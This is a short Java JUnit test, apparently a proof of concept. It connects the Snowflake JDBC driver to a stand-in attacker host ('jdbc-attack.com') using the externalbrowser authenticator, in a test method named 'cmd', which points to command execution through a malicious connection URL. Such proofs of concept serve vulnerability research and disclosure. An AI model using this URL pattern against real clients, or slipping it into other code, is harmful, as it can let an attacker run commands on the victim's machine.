package com.trganda.poc;

import org.junit.jupiter.api.Test;

import java.sql.DriverManager;
import java.sql.SQLException;

public class Poc {
    @Test
    public void cmd() throws SQLException {
        String url =
                "jdbc:snowflake://jdbc-attack.com/?user=trganda&passwd=trganda&db=db&authenticator=externalbrowser";

        DriverManager.getConnection(url);
    }
}
